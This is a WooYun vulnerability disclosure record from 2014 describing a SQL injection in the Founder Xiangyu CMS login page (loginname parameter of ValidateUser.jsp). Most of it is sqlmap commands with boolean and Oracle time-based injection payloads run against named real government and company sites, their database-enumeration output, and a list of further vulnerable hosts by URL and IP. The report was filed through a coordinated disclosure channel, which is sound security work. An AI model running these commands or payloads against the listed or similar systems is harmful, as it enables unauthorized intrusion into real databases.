{"id": 43595, "wybug_id": "wooyun-2014-082293", "wybug_title": "北大方正翔宇CMS系统通用型SQL注入漏洞", "wybug_corp": "北大方正电子科技有限公司", "wybug_author": "error", "wybug_date": "2014-11-07 18:28", "wybug_open_date": "2015-02-05 18:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向公众公开  简要描述： RT 详细说明：  北大方正翔宇CMS系统\"验证用户登录\"接口缺少过滤导致SQL注入\n方正翔宇CMS系统\"验证用户登录\"接口缺少过滤导致SQL注入注入链接：/enpadmin/ValidateUser.jsp注入参数：loginname\n   漏洞证明：  \n(1)http://www.hbsjtt.gov.cn:81/   河北省交通运输厅\n\n注入链接：http://www.hbsjtt.gov.cn:81/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11$ python sqlmap.py -u 'http://www.hbsjtt.gov.cn:81/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11' -p loginname --dbms oracle --level 5 --risk 3 --batch --dbs -v 1--Place: GETParameter: loginname    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: loginname=-2343' OR (5408=5408) AND 'cTqT'='cTqT&userpwd=11    Type: AND/OR time-based blind    Title: Oracle OR time-based blind    Payload: loginname=-3303' OR 9701=DBMS_PIPE.RECEIVE_MESSAGE(CHR(78)||CHR(74)||CHR(79)||CHR(74),5) AND 'xlHu'='xlHu&userpwd=11---[20:27:48] [INFO] the back-end DBMS is Oracleweb application technology: Apache, JSPback-end DBMS: Oracle[20:27:48] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DB[20:27:48] [INFO] fetching database (schema) names[20:27:48] [INFO] fetching number of databases[20:27:49] [INFO] resumed: 17[20:27:49] [INFO] resumed: CMSUSER[20:27:49] [INFO] resumed: CTXSYS[20:27:49] [INFO] resumed: DBSNMP[20:27:49] [INFO] resumed: DMSYS[20:27:49] [INFO] resumed: EXFSYS[20:27:49] [INFO] resumed: FUIM[20:27:49] [INFO] resumed: MDSYS[20:27:49] [INFO] resumed: OLAPSYS[20:27:49] [INFO] resumed: ORDSYS[20:27:49] [INFO] resumed: OUTLN[20:27:49] [INFO] resumed: SCOTT[20:27:49] [INFO] resumed: SYS[20:27:49] [INFO] resumed: SYSMAN[20:27:49] [INFO] resumed: SYSTEM[20:27:49] [INFO] resumed: TSMSYS[20:27:49] [INFO] resumed: WMSYS[20:27:49] [INFO] resumed: XDBavailable databases [17]:[*] CMSUSER[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] FUIM[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB\n\n\n\n(2)http://www.sxjmfxky.com:6565/  汾西矿业集团注入链接：http://www.sxjmfxky.com:6565/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11$ python sqlmap.py -u 'http://www.sxjmfxky.com:6565/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11' -p loginname --dbms oracle --level 5 --risk 3 --batch --dbs -v 1---Place: GETParameter: loginname    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: loginname=-4846' OR (4419=4419) AND 'njUu'='njUu&userpwd=11    Type: AND/OR time-based blind    Title: Oracle OR time-based blind    Payload: loginname=-8756' OR 9026=DBMS_PIPE.RECEIVE_MESSAGE(CHR(119)||CHR(122)||CHR(67)||CHR(112),5) AND 'MalG'='MalG&user---[21:07:44] [INFO] the back-end DBMS is Oracleweb application technology: Servlet 2.5, JSP, JSP 2.1back-end DBMS: Oracle[21:07:44] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other[21:07:44] [INFO] fetching database (schema) names[21:07:44] [INFO] fetching number of databases[21:07:44] [INFO] resumed: 19[21:07:44] [INFO] resumed: CMSUSER[21:07:44] [INFO] resumed: CTXSYS[21:07:44] [INFO] resumed: DBSNMP[21:07:44] [INFO] resumed: EXFSYS[21:07:44] [INFO] resumed: FLOWS_030000[21:07:44] [INFO] resumed: FLOWS_FILES[21:07:44] [INFO] resumed: MDSYS[21:07:44] [INFO] resumed: OLAPSYS[21:07:44] [INFO] resumed: ORDSYS[21:07:44] [INFO] resumed: OUTLN[21:07:44] [INFO] resumed: SCOTT[21:07:44] [INFO] resumed: SYS[21:07:44] [INFO] resumed: SYSMAN[21:07:44] [INFO] resumed: SYSTEM[21:07:44] [INFO] resumed: TSMSYS[21:07:44] [INFO] resumed: WKSYS[21:07:44] [INFO] resumed: WK_TEST[21:07:44] [INFO] resumed: WMSYS[21:07:44] [INFO] resumed: XDBavailable databases [19]:[*] CMSUSER[*] CTXSYS[*] DBSNMP[*] EXFSYS[*] FLOWS_030000[*] FLOWS_FILES[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WK_TEST[*] WKSYS[*] WMSYS[*] XDB\n\n\n\n(3)http://jjc.hbsjtt.gov.cn:81/  河北省高速公路建设指挥部注入链接：http://jjc.hbsjtt.gov.cn:81/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11$ python sqlmap.py -u 'http://jjc.hbsjtt.gov.cn:81/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11' -p loginname --dbms oracle --level 5 --risk 3 --batch --dbs -v 1 --threads 10---Place: GETParameter: loginname    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: loginname=-5795' OR (6437=6437) AND 'PjLa'='PjLa&userpwd=11    Type: AND/OR time-based blind    Title: Oracle OR time-based blind    Payload: loginname=-4357' OR 6637=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(97)||CHR(87),5) AND 'wxKa'='wxKa&userpwd=---[20:51:42] [INFO] the back-end DBMS is Oracleweb application technology: Apache, JSPback-end DBMS: Oracle[20:51:42] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other D[20:51:42] [INFO] fetching database (schema) names[20:51:42] [INFO] fetching number of databases[20:51:42] [INFO] resumed: 17[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 7[20:51:42] [INFO] resumed: CMSUSER[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 6[20:51:42] [INFO] resumed: CTXSYS[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 6[20:51:42] [INFO] resumed: DBSNMP[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 5[20:51:42] [INFO] resumed: DMSYS[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 6[20:51:42] [INFO] resumed: EXFSYS[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 4[20:51:42] [INFO] resumed: FUIM[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 5[20:51:42] [INFO] resumed: MDSYS[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 7[20:51:42] [INFO] resumed: OLAPSYS[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 6[20:51:42] [INFO] resumed: ORDSYS[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 5[20:51:42] [INFO] resumed: OUTLN[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 5[20:51:42] [INFO] resumed: SCOTT[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 3[20:51:42] [INFO] resumed: SYS[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 6[20:51:42] [INFO] resumed: SYSMAN[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 6[20:51:42] [INFO] resumed: SYSTEM[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 6[20:51:42] [INFO] resumed: TSMSYS[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 5[20:51:42] [INFO] resumed: WMSYS[20:51:42] [INFO] retrieving the length of query output[20:51:42] [INFO] resumed: 3[20:51:42] [INFO] resumed: XDBavailable databases [17]:[*] CMSUSER[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] FUIM[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB\n\n\n\n(4)http://www.tsrb.com.cn:7001注入链接：http://www.tsrb.com.cn:7001/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11$ python sqlmap.py -u 'http://www.tsrb.com.cn:7001/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11' -p loginname  --dbms oracle --level 5 --risk 3 --dbs -v 1 --batch --threads 10---Place: GETParameter: loginname    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: loginname=-8135' OR (1388=1388) AND 'IjWe'='IjWe&userpwd=11    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: loginname=11' AND 7290=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(71)||CHR(106)||CHR(66),5) AND 'azXy'='azX---[20:49:07] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[20:49:07] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names[20:49:07] [INFO] fetching database (schema) names[20:49:07] [INFO] fetching number of databases[20:49:07] [INFO] resumed: 16[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 7[20:49:07] [INFO] resumed: CMSUSER[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 6[20:49:07] [INFO] resumed: CTXSYS[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 6[20:49:07] [INFO] resumed: DBSNMP[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 5[20:49:07] [INFO] resumed: DMSYS[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 6[20:49:07] [INFO] resumed: EXFSYS[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 5[20:49:07] [INFO] resumed: MDSYS[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 7[20:49:07] [INFO] resumed: OLAPSYS[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 6[20:49:07] [INFO] resumed: ORDSYS[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 5[20:49:07] [INFO] resumed: OUTLN[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 5[20:49:07] [INFO] resumed: SCOTT[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 3[20:49:07] [INFO] resumed: SYS[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 6[20:49:07] [INFO] resumed: SYSMAN[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 6[20:49:07] [INFO] resumed: SYSTEM[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 6[20:49:07] [INFO] resumed: TSMSYS[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 5[20:49:07] [INFO] resumed: WMSYS[20:49:07] [INFO] retrieving the length of query output[20:49:07] [INFO] resumed: 3[20:49:07] [INFO] resumed: XDBavailable databases [16]:[*] CMSUSER[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB\n\n\n\n其他案例：http://www.qxjy.net.cn:7001/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11http://202.102.241.208/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11http://221.204.238.109:7001/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11http://122.224.215.7:7001/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11http://221.1.80.11:7001/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11http://61.153.35.46:7001/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11http://61.136.223.245:7001/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11http://125.64.41.159:7001/enpadmin/ValidateUser.jsp?loginname=11&userpwd=11\n   修复方案：  过滤   版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-11-11 14:28 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}